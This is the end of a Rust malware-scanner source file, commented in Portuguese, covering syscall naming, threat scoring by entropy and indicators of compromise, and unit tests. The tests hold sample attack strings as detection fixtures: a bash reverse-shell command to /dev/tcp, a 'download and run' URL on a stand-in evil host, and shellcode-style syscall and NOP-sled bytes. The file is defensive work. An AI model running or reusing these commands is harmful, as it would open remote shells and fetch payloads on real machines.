        11 => "munmap",
        22 => "pipe",
        32 => "dup",
        33 => "dup2",
        41 => "socket",
        42 => "connect",
        43 => "accept",
        44 => "sendto",
        45 => "recvfrom",
        49 => "bind",
        50 => "listen",
        56 => "clone",
        57 => "fork",
        58 => "vfork",
        59 => "execve",
        60 => "exit",
        62 => "kill",
        101 => "ptrace",
        157 => "prctl",
        165 => "mount",
        169 => "reboot",
        231 => "exit_group",
        322 => "execveat",
        _ => return None,
    })
}

fn eh_registrador_64bits(reg: iced_x86::Register) -> bool {
    use iced_x86::Register::*;
    matches!(
        reg,
        RAX | RBX | RCX | RDX | RSI | RDI | RSP | RBP | R8 | R9 | R10 | R11 | R12 | R13
            | R14
            | R15
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// Scoring e nível de ameaça
// ─────────────────────────────────────────────────────────────────────────────

#[allow(clippy::too_many_arguments)] // função interna com 1 chamador; parâmetros nomeados são mais claros que builder
fn calcular_nivel_ameaca(
    entropia: f64,
    iocs: &[IoC],
    instrucoes_suspeitas: &[InstrucaoSuspeita],
    imports_suspeitos: &[ImportSuspeito],
    secoes_anomalas: &[SecaoAnomala],
    tem_exec: bool,
    veio_internet: bool,
    formato_comprimido: bool,
) -> (f64, NivelAmeaca) {
    let mut pontos = 0.0f64;

    // Entropia alta é esperada em containers comprimidos (ZIP/APK/GZip…);
    // só pontua se for um binário raw com entropia suspeita.
    if !formato_comprimido {
        if entropia > 7.5 {
            pontos += 3.0;
        } else if entropia > 7.0 {
            pontos += 2.0;
        } else if entropia > 6.5 {
            pontos += 1.0;
        }
    }

    // Acumula pontos por categoria e aplica caps — evita que um único tipo
    // de sinal (ex: muitas syscalls em binário estático) domine o veredito.
    let mut acc: std::collections::HashMap<&'static str, f64> =
        std::collections::HashMap::new();
    let mut soma = |chave: &'static str, valor: f64| {
        *acc.entry(chave).or_insert(0.0) += valor;
    };

    for ioc in iocs {
        match ioc.tipo {
            TipoIoC::Ipv4 | TipoIoC::Ipv6 => soma("ioc_ip", 2.0),
            TipoIoC::Url => soma("ioc_url", 1.5),
            TipoIoC::CarteiraBtc | TipoIoC::CarteiraXmr | TipoIoC::CarteiraEth => {
                soma("ioc_crypto", 4.0)
            }
            TipoIoC::ComandoSuspeito => soma("ioc_cmd", 2.5),
        }
    }

    for imp in imports_suspeitos {
        let chave: &'static str = match imp.categoria {
            CategoriaImport::AntiDebug => "imp_antidebug",
            CategoriaImport::ResolucaoDinamica => "imp_dyn",
            CategoriaImport::SpawnProcesso => "imp_spawn",
            CategoriaImport::AbusoMemoria => "imp_mem",
        };
        soma(chave, imp.categoria.peso());
    }

    soma("secao", secoes_anomalas.len() as f64 * 1.5);

    for inst in instrucoes_suspeitas {
        match inst.mnemonico.as_str() {
            "syscall" if inst.motivo.contains("execve") || inst.motivo.contains("ptrace") => {
                soma("syscall_critica", 2.5)
            }
            "syscall" => soma("syscall", 1.0),
            "nop" => soma("nop_sled", 2.0),
            "vmcall" | "vmlaunch" | "vmread" | "vmwrite" => soma("vmx", 2.0),
            "rdtsc" => soma("rdtsc", 0.5),
            "xor" => soma("xor", 0.5),
            _ => soma("outros", 0.5),
        }
    }

    // Cap por categoria — uma única classe não vale mais que [`CAP_POR_CATEGORIA`]
    // pontos. Mantém alta sensibilidade ao composto de sinais distintos.
    const CAP_POR_CATEGORIA: f64 = 5.0;
    for v in acc.values() {
        pontos += v.min(CAP_POR_CATEGORIA);
    }

    // Executável com origem confirmada na internet — risco real
    if tem_exec && veio_internet {
        pontos += 4.0;
    } else if veio_internet {
        pontos += 1.5;
    } else if tem_exec {
        pontos += 0.5;
    }

    let nivel = match pontos as u32 {
        0 => NivelAmeaca::Limpo,
        1..=2 => NivelAmeaca::Baixo,
        3..=4 => NivelAmeaca::Medio,
        5..=7 => NivelAmeaca::Alto,
        _ => NivelAmeaca::Critico,
    };

    (pontos, nivel)
}

// ─────────────────────────────────────────────────────────────────────────────
// Testes unitários
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Entropia de Shannon ────────────────────────────────────────────────

    #[test]
    fn entropia_dados_vazios_eh_zero() {
        assert_eq!(calcular_entropia(&[]), 0.0);
    }

    #[test]
    fn entropia_bytes_iguais_eh_zero() {
        let dados = vec![0x41u8; 1024];
        assert!(calcular_entropia(&dados).abs() < 1e-9);
    }

    #[test]
    fn entropia_distribuicao_uniforme_proxima_de_oito() {
        let dados: Vec<u8> = (0..=255).cycle().take(8192).collect();
        let e = calcular_entropia(&dados);
        assert!(e > 7.99 && e <= 8.0, "esperado ≈ 8.0, obtido {e}");
    }

    #[test]
    fn entropia_alta_em_dados_pseudoaleatorios() {
        // Sequência LCG simples — pseudoaleatória, alta entropia esperada (> 7.5).
        let mut x: u64 = 0xC0FFEE;
        let dados: Vec<u8> = (0..4096)
            .map(|_| {
                x = x.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
                (x >> 32) as u8
            })
            .collect();
        assert!(calcular_entropia(&dados) > 7.5);
    }

    // ── Detecção de container comprimido ───────────────────────────────────

    #[test]
    fn formato_comprimido_zip_apk_jar() {
        assert!(eh_formato_comprimido(&[0x50, 0x4B, 0x03, 0x04, 0xAA, 0xBB]));
        assert!(eh_formato_comprimido(&[0x50, 0x4B, 0x05, 0x06, 0x00]));
    }

    #[test]
    fn formato_comprimido_gzip_bzip2_xz() {
        assert!(eh_formato_comprimido(&[0x1F, 0x8B, 0x08]));
        assert!(eh_formato_comprimido(b"BZh9"));
        assert!(eh_formato_comprimido(&[0xFD, b'7', b'z', b'X', b'Z', 0x00]));
    }

    #[test]
    fn formato_comprimido_7zip_rar_zstd_lz4() {
        assert!(eh_formato_comprimido(&[b'7', b'z', 0xBC, 0xAF, 0x27, 0x1C]));
        assert!(eh_formato_comprimido(&[b'R', b'a', b'r', b'!', 0x1A, 0x07, 0x00]));
        assert!(eh_formato_comprimido(&[0x28, 0xB5, 0x2F, 0xFD, 0x00]));
        assert!(eh_formato_comprimido(&[0x02, 0x21, 0x4C, 0x18, 0x00]));
    }

    #[test]
    fn formato_comprimido_rejeita_elf_e_aleatorio() {
        assert!(!eh_formato_comprimido(b"\x7fELF"));
        assert!(!eh_formato_comprimido(b"hello world"));
        assert!(!eh_formato_comprimido(&[]));
        assert!(!eh_formato_comprimido(&[0x50])); // muito curto pra ZIP
    }

    // ── IPs privados / OIDs ────────────────────────────────────────────────

    #[test]
    fn ip_privado_rfc1918_e_reservados() {
        for ip in [
            "10.0.0.1", "10.255.255.254",
            "192.168.0.1", "192.168.1.100",
            "172.16.0.1", "172.20.5.5", "172.31.255.254",
            "127.0.0.1", "0.0.0.0", "255.255.255.255",
            "169.254.1.1",
            "224.0.0.1", "240.0.0.0",
        ] {
            assert!(ip_privado(ip), "esperado privado: {ip}");
        }
    }

    #[test]
    fn ip_privado_rejeita_publicos() {
        for ip in ["8.8.8.8", "1.1.1.1", "185.220.101.45", "93.184.216.34"] {
            assert!(!ip_privado(ip), "esperado público: {ip}");
        }
    }

    #[test]
    fn ip_privado_descarta_octeto_com_zero_inicial() {
        // "13.24.04.15" → octeto "04" inválido; "1.2.3.08" idem
        assert!(ip_privado("13.24.04.15"));
        assert!(ip_privado("1.2.3.08"));
        assert!(ip_privado("0.1.2.3")); // já coberto, mas registra
        // Não confundir com "10.x.x.x" que é RFC1918 normal
        assert!(ip_privado("10.0.0.1"));
    }

    #[test]
    fn ip_privado_descarta_oids_comuns() {
        // OIDs comuns em certificados X.509 não devem ser tratados como IPs públicos.
        assert!(ip_privado("1.3.6.1"));
        assert!(ip_privado("2.5.4.3"));
        assert!(ip_privado("2.16.840.1"));
        assert!(ip_privado("1.2.840.10045"));
    }

    // ── Varredura de IoCs ──────────────────────────────────────────────────

    #[test]
    fn ioc_detecta_ip_publico_isolado() {
        let texto = b"connect to 185.220.101.45 on port 8080";
        let iocs = varrer_iocs(texto);
        assert_eq!(iocs.len(), 1);
        assert_eq!(iocs[0].tipo, TipoIoC::Ipv4);
        assert_eq!(iocs[0].valor, "185.220.101.45");
    }

    #[test]
    fn ioc_ignora_ip_privado() {
        let texto = b"local server at 192.168.1.10";
        assert!(varrer_iocs(texto).is_empty());
    }

    #[test]
    fn ioc_ignora_string_de_versao() {
        let texto = b"installed pkg-1.24.0.38-linux successfully";
        assert!(varrer_iocs(texto).is_empty());
    }

    #[test]
    fn ioc_deduplica_ocorrencias_repetidas() {
        let texto = b"first 185.220.101.45 second 185.220.101.45 third 185.220.101.45";
        assert_eq!(varrer_iocs(texto).len(), 1);
    }

    #[test]
    fn ioc_encontra_multiplos_distintos() {
        let texto = b"c2 servers: 185.220.101.45 and 93.184.216.34 and 1.1.1.1";
        let iocs: Vec<_> = varrer_iocs(texto).into_iter()
            .filter(|i| i.tipo == TipoIoC::Ipv4)
            .collect();
        assert_eq!(iocs.len(), 3);
    }

    #[test]
    fn ioc_detecta_ipv6_publico() {
        let texto = b"connect to 2001:db8::face:b00c on port 443";
        let iocs = varrer_iocs(texto);
        let v6: Vec<_> = iocs.iter().filter(|i| i.tipo == TipoIoC::Ipv6).collect();
        assert_eq!(v6.len(), 1, "esperava 1 IPv6, iocs={iocs:?}");
    }

    #[test]
    fn ioc_ignora_ipv6_loopback_e_link_local() {
        let texto = b"local: ::1 e fe80::1 e ff02::1";
        let iocs = varrer_iocs(texto);
        assert!(iocs.iter().all(|i| i.tipo != TipoIoC::Ipv6));
    }

    #[test]
    fn ioc_detecta_url_http() {
        let texto = b"download from http://evil.example.com/payload.bin and run";
        let iocs = varrer_iocs(texto);
        let urls: Vec<_> = iocs.iter().filter(|i| i.tipo == TipoIoC::Url).collect();
        assert_eq!(urls.len(), 1);
        assert!(urls[0].valor.starts_with("http://evil.example.com"));
    }

    #[test]
    fn ioc_ignora_urls_de_namespace_xml() {
        let texto = b"xmlns=\"http://www.w3.org/2000/svg\"";
        let iocs = varrer_iocs(texto);
        assert!(iocs.iter().all(|i| i.tipo != TipoIoC::Url));
    }

    #[test]
    fn ioc_detecta_endereco_bitcoin_legado() {
        let texto = b"send btc to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa now";
        let iocs = varrer_iocs(texto);
        assert!(iocs.iter().any(|i| i.tipo == TipoIoC::CarteiraBtc));
    }

    #[test]
    fn ioc_detecta_endereco_ethereum() {
        let texto = b"wallet=0xdAC17F958D2ee523a2206206994597C13D831ec7 transfer";
        let iocs = varrer_iocs(texto);
        assert!(iocs.iter().any(|i| i.tipo == TipoIoC::CarteiraEth));
    }

    #[test]
    fn ioc_descarta_zero_address_ethereum() {
        let texto = b"const ZERO=0x0000000000000000000000000000000000000000;";
        let iocs = varrer_iocs(texto);
        assert!(!iocs.iter().any(|i| i.tipo == TipoIoC::CarteiraEth));
    }

    #[test]
    fn ioc_detecta_comando_reverse_shell() {
        let texto = b"exec bash -i >& /dev/tcp/1.2.3.4/9001 0>&1";
        let iocs = varrer_iocs(texto);
        let cmds: Vec<_> = iocs.iter().filter(|i| i.tipo == TipoIoC::ComandoSuspeito).collect();
        assert!(cmds.len() >= 2, "deve detectar bash -i e /dev/tcp/: {iocs:?}");
    }

    // ── Scoring ────────────────────────────────────────────────────────────

    #[test]
    fn scoring_arquivo_neutro_eh_limpo() {
        let (pts, nivel) = calcular_nivel_ameaca(5.5, &[], &[], &[], &[], false, false, false);
        assert_eq!(pts, 0.0);
        assert_eq!(nivel, NivelAmeaca::Limpo);
    }

    #[test]
    fn scoring_entropia_alta_isolada_pontua_baixo() {
        let (pts, nivel) = calcular_nivel_ameaca(7.6, &[], &[], &[], &[], false, false, false);
        assert_eq!(pts, 3.0);
        assert_eq!(nivel, NivelAmeaca::Medio);
    }

    #[test]
    fn scoring_entropia_alta_em_container_nao_pontua() {
        let (pts, nivel) = calcular_nivel_ameaca(7.9, &[], &[], &[], &[], false, false, true);
        assert_eq!(pts, 0.0);
        assert_eq!(nivel, NivelAmeaca::Limpo);
    }

    #[test]
    fn scoring_executavel_da_internet_dispara_alto() {
        let (pts, nivel) = calcular_nivel_ameaca(5.0, &[], &[], &[], &[], true, true, false);
        assert_eq!(pts, 4.0);
        assert_eq!(nivel, NivelAmeaca::Medio);
    }

    // ── Heurísticas ELF (disassembly) ──────────────────────────────────────

    #[test]
    fn heuristica_detecta_syscall_isolada() {
        // 0F 05 = syscall
        let suspeitas = analisar_instrucoes(0x1000, &[0x0F, 0x05]);
        assert_eq!(suspeitas.len(), 1);
        assert_eq!(suspeitas[0].mnemonico, "syscall");
    }

    #[test]
    fn heuristica_identifica_execve_via_mov_rax_imm() {
        // mov rax, 0x3b  (48 C7 C0 3B 00 00 00) ; syscall (0F 05)
        let bytes = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x0F, 0x05];
        let suspeitas = analisar_instrucoes(0x1000, &bytes);
        assert_eq!(suspeitas.len(), 1);
        assert!(suspeitas[0].motivo.contains("execve"), "motivo={}", suspeitas[0].motivo);
    }

    #[test]
    fn heuristica_identifica_ptrace_via_mov_rax_imm() {
        // mov eax, 0x65 (B8 65 00 00 00) ; syscall (0F 05)
        // EAX = 32-bit alias de RAX, válido para detecção.
        let bytes = [0xB8, 0x65, 0x00, 0x00, 0x00, 0x0F, 0x05];
        let suspeitas = analisar_instrucoes(0x2000, &bytes);
        assert_eq!(suspeitas.len(), 1);
        assert!(suspeitas[0].motivo.contains("ptrace"));
    }

    #[test]
    fn heuristica_detecta_xor_reg_reg_64bit() {
        // xor rax, rax (48 31 C0)
        let suspeitas = analisar_instrucoes(0x1000, &[0x48, 0x31, 0xC0]);
        assert_eq!(suspeitas.len(), 1);
        assert_eq!(suspeitas[0].mnemonico, "xor");
    }

    #[test]
    fn heuristica_detecta_rdtsc() {
        // 0F 31 = rdtsc
        let suspeitas = analisar_instrucoes(0x1000, &[0x0F, 0x31]);
        assert_eq!(suspeitas.len(), 1);
        assert_eq!(suspeitas[0].mnemonico, "rdtsc");
    }

    #[test]
    fn heuristica_detecta_sled_de_nops() {
        // 20 bytes de 0x90 seguidos de um ret (C3)
        let mut bytes = vec![0x90u8; 20];
        bytes.push(0xC3);
        let suspeitas = analisar_instrucoes(0x1000, &bytes);
        // 1 sled + (ret não é suspeita)
        assert!(
            suspeitas.iter().any(|s| s.mnemonico == "nop"),
            "esperava detecção de sled, suspeitas={suspeitas:?}"
        );
    }

    #[test]
    fn heuristica_ignora_nops_curtos() {
        // 8 bytes de 0x90 — abaixo do limiar LIMIAR_NOP_SLED (16).
        let bytes = vec![0x90u8; 8];
        let suspeitas = analisar_instrucoes(0x1000, &bytes);
        assert!(!suspeitas.iter().any(|s| s.mnemonico == "nop"));
    }

    #[test]
    fn heuristica_detecta_vmcall() {
        // vmcall: 0F 01 C1
        let suspeitas = analisar_instrucoes(0x1000, &[0x0F, 0x01, 0xC1]);
        assert!(suspeitas.iter().any(|s| s.mnemonico == "vmcall"));
    }

    #[test]
    fn secao_padrao_reconhecida_corretamente() {
        for nome in [".text", ".data", ".rodata", ".bss", ".init", ".fini",
                     ".plt", ".got", ".dynamic", ".dynsym", ".dynstr",
                     ".debug_info", ".rela.dyn", ".gnu.hash", ".note.ABI-tag",
                     ".eh_frame", ".gopclntab"] {
            assert!(secao_eh_padrao(nome), "esperava padrão: {nome}");
        }
    }

    #[test]
    fn secao_customizada_nao_eh_padrao() {
        for nome in [".upx", ".packed", ".vmprotect", ".themida", ".bn_zlib",
                     ".strange_section"] {
            assert!(!secao_eh_padrao(nome), "esperava custom: {nome}");
        }
    }

    #[test]
    fn classificar_import_categoriza_corretamente() {
        assert_eq!(classificar_import("ptrace"), Some(CategoriaImport::AntiDebug));
        assert_eq!(classificar_import("dlsym"), Some(CategoriaImport::ResolucaoDinamica));
        assert_eq!(
            classificar_import("execve@GLIBC_2.2.5"),
            Some(CategoriaImport::SpawnProcesso)
        );
        assert_eq!(classificar_import("mprotect"), Some(CategoriaImport::AbusoMemoria));
        assert_eq!(classificar_import("strcmp"), None);
        assert_eq!(classificar_import("printf"), None);
    }

    #[test]
    fn import_peso_anti_debug_eh_maior_que_spawn() {
        assert!(CategoriaImport::AntiDebug.peso() > CategoriaImport::SpawnProcesso.peso());
    }

    #[test]
    fn nomes_syscall_essenciais() {
        assert_eq!(nome_syscall_x86_64(59), Some("execve"));
        assert_eq!(nome_syscall_x86_64(101), Some("ptrace"));
        assert_eq!(nome_syscall_x86_64(10), Some("mprotect"));
        assert_eq!(nome_syscall_x86_64(9999), None);
    }

    #[test]
    fn scoring_syscall_execve_pesa_mais_que_generico() {
        let execve = vec![InstrucaoSuspeita {
            endereco: 0,
            mnemonico: "syscall".into(),
            operandos: String::new(),
            motivo: "Syscall direta ao kernel (execve) — bypass libc / shellcode".into(),
        }];
        let generico = vec![InstrucaoSuspeita {
            endereco: 0,
            mnemonico: "syscall".into(),
            operandos: String::new(),
            motivo: "Syscall direta ao kernel — padrão de shellcode/bypass libc".into(),
        }];
        let (pts_execve, _) = calcular_nivel_ameaca(5.0, &[], &execve, &[], &[], false, false, false);
        let (pts_gen, _) = calcular_nivel_ameaca(5.0, &[], &generico, &[], &[], false, false, false);
        assert!(pts_execve > pts_gen, "{pts_execve} deve ser > {pts_gen}");
    }

    #[test]
    fn scoring_cap_por_categoria_evita_explosao() {
        // 50 syscalls genéricos não devem somar 50 pontos — devem ser limitados.
        let mut suspeitas = Vec::new();
        for i in 0..50 {
            suspeitas.push(InstrucaoSuspeita {
                endereco: i,
                mnemonico: "syscall".into(),
                operandos: String::new(),
                motivo: "Syscall direta ao kernel".into(),
            });
        }
        let (pts, _) = calcular_nivel_ameaca(5.0, &[], &suspeitas, &[], &[], false, false, false);
        // Cap = 5.0 — não pode passar disso só com syscalls genéricos.
        assert!(pts <= 5.0, "esperado <= 5.0, obtido {pts}");
    }

    #[test]
    fn scoring_multiplos_sinais_resulta_critico() {
        let iocs = vec![
            IoC::novo(TipoIoC::Ipv4, "185.220.101.45"),
            IoC::novo(TipoIoC::Ipv4, "93.184.216.34"),
        ];
        let suspeitas = vec![
            InstrucaoSuspeita {
                endereco: 0x1000,
                mnemonico: "syscall".into(),
                operandos: String::new(),
                motivo: "test".into(),
            },
            InstrucaoSuspeita {
                endereco: 0x1010,
                mnemonico: "syscall".into(),
                operandos: String::new(),
                motivo: "test".into(),
            },
        ];
        let (pts, nivel) = calcular_nivel_ameaca(7.8, &iocs, &suspeitas, &[], &[], true, true, false);
        // entropia 7.8 (+3) + 2 IoCs (+4) + 2 syscalls (+2) + exec+internet (+4) = 13.0
        assert!(pts >= 8.0, "esperado >= 8.0, obtido {pts}");
        assert_eq!(nivel, NivelAmeaca::Critico);
    }
}
